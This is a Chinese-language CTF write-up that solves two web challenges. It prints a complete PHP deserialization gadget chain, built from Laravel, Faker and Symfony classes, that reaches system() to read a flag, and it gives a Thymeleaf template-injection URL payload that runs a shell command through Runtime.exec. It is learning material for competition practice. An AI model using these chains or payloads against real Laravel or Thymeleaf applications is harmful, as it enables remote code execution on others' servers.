### Just Kidding



先用dirsearch扫一下，发现`/www.zip`
下载下来源码，本地构建了个环境
联系到题目说的`Laravel`，很明显就是一个关于Laravel的框架题了，先去google了一下`Laravel 9.12.2 exploit`没找到，看了下最新的是9.8
于是想着自己对着教程挖挖洞，然后看ctfshow的Laravel挖7.x的洞的视频，还是有很多地方有些不一样，于是就放弃了
如果是自己挖的话，题目应该不会出这么快
最后还是去看来下9.8的链子，一个最新的rce链子再本地用的时候，惊喜的发现弹出来了计算器
最终的exploit

```php
<?php
namespace Faker{
    class Generator{
        protected $providers = [];
        protected $formatters = [];
        function __construct()
        {
            $this->formatter = "dispatch";
            $this->formatters = 9999;
        }

    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        public function __construct()
        {
            $this->event = "cat /flag";
            $this->events = new \Faker\Generator();
        }
    }
}

namespace Symfony\Component\Mime\Part{
    abstract class AbstractPart
    {
        private $headers = null;
    }
    class SMimePart extends AbstractPart{
        protected $_headers;
        public $inhann;
        function __construct(){
            $this->_headers = ["dispatch"=>"system"];
            $this->inhann = new \Illuminate\Broadcasting\PendingBroadcast();
        }
    }
}


namespace{
    $a = new \Symfony\Component\Mime\Part\SMimePart();
    $ser = preg_replace("/([^\{]*\{)(.*)(s:49.*)(\})/","\\1\\3\\2\\4",serialize($a));
    echo base64_encode(str_replace("i:9999","R:2",$ser));
}
```

目前跟着找链子还勉强能跟着，但其实很多地方还是不太了解，所以等学了反序列化再来尝试自己复盘7.x的链子和这条链子吧



## Challenger

这道题是`Thymeleaf模板注入`

给了jar附件，直接解压或者反编译都可

发现`/eval`路由下存在`lang`变量可控，并且返回了`lang`

payload：

```text
/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat flag%22).getInputStream()).next()%7d__::.
```

不会java(T_T)



想复盘一下`博学多闻的花花`和`QRCode Maker`但实在是无从下手，先学习吧...











